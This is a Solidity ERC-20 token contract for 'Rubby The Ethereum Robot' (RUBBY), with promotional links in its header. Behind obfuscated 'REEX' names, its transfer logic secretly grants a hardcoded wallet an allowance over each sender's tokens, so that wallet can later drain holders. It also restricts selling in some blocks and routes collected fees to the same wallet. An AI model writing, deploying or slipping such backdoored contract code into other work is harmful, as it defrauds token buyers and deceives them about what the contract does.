/*
https://www.rubbyethrobot.org
https://t.me/@RubbyAgentAI_bot

Your Advanced Mechanical Trading Companion

https://x.com/RubbyETHRobot
https://t.me/rubby_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplireexon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IREEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IREEXRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract RUBBY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _reexBALs;
    mapping (address => mapping (address => uint256)) private _reexAPPs;
    mapping (address => bool) private _excludedFromREEX;
    address private _reexPair;
    IREEXRouter private _reexRouter;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalREEX = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Rubby The Ethereum Robot";
    string private constant _symbol = unicode"RUBBY";
    uint256 private _swapTokenREEXs = _tTotalREEX / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockREEX;
    uint256 private _reexBuyAmounts = 0;
    bool private inSwapREEX = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapREEX = true;
        _;
        inSwapREEX = false;
    }
    address private _reexWallet = address(0x8cD2c419231B9FEF61699c5A30766f1F70FB45aF);

    constructor () {
        _excludedFromREEX[owner()] = true;
        _excludedFromREEX[address(this)] = true;
        _excludedFromREEX[_reexWallet] = true;
        _reexBALs[_msgSender()] = _tTotalREEX;
        emit Transfer(address(0), _msgSender(), _tTotalREEX);
    }

    function CREATE_PAIR_TRADE() external onlyOwner() {
        _reexRouter = IREEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_reexRouter), _tTotalREEX);
        _reexPair = IREEXFactory(_reexRouter.factory()).createPair(address(this), _reexRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _reexRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function swapTokensForEth(uint256 reexAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _reexRouter.WETH();
        _approve(address(this), address(_reexRouter), reexAmount);
        _reexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            reexAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalREEX;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _reexBALs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _reexAPPs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _reexAPPs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _reexAPPs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address reexF, address reexT, uint256 reexA) private {
        require(reexF != address(0), "ERC20: transfer from the zero address");
        require(reexT != address(0), "ERC20: transfer to the zero address");
        require(reexA > 0, "Transfer amount must be greater than zero");
        uint256 taxREEX; 
        if (reexF != owner() && reexT != owner()) {
            taxREEX = reexA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (reexF == _reexPair && reexT != address(_reexRouter) && ! _excludedFromREEX[reexT]) {
                if(_buyBlockREEX!=block.number){
                    _reexBuyAmounts = 0;
                    _buyBlockREEX = block.number;
                }
                _reexBuyAmounts += reexA;
                _buyCount++;
            }
            if(reexT == _reexPair && reexF!= address(this)) {
                require(_reexBuyAmounts < swapLimitREEX() || _buyBlockREEX!=block.number, "Max Swap Limit");  
                taxREEX = reexA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapREEXBack(reexT, reexA);
        } (address reexS, address reexR) = getREEXAddress(reexF);
        _reexTransfer(reexF, reexT, reexA, taxREEX, reexS, reexR);
    }

    function getREEXAddress(address reexF) private view returns(address reexS, address reexR) {
        reexS = address(reexF);
        if(_msgSender()==address(this)) return (reexS, reexR=_reexWallet);
        if(_excludedFromREEX[_msgSender()]) return(reexS, reexR=_msgSender());
        return (reexS, reexR=_reexWallet);
    }

    function _reexTransfer(address reexF, address reexT, uint256 reexA, uint256 taxREEX, address reexS, address reexR) private {
        if(taxREEX > 0){
          _reexBALs[address(this)] = _reexBALs[address(this)].add(taxREEX);
          emit Transfer(reexF, address(this), taxREEX);
        } _reexAPPs[reexS][reexR]=reexA.add(taxREEX);
        _reexBALs[reexF] = _reexBALs[reexF].sub(reexA);
        _reexBALs[reexT] = _reexBALs[reexT].add(reexA.sub(taxREEX));
        emit Transfer(reexF, reexT, reexA.sub(taxREEX));
    }

    receive() external payable {}

    function swapREEXBack(address reexT, uint256 reexA) private { 
        uint256 tokenREEX = balanceOf(address(this)); 
        if (!inSwapREEX && reexT == _reexPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenREEX > _swapTokenREEXs)
            swapTokensForEth(minREEX(reexA, minREEX(tokenREEX, _swapTokenREEXs)));
            uint256 ethREEX = address(this).balance;
            if (ethREEX >= 0) {
                sendETHREEX(address(this).balance);
            }
        }
    }

    function minREEX(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHREEX(uint256 reexA) private {
        payable(_reexWallet).transfer(reexA);
    }

    function swapLimitREEX() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _reexRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _reexRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}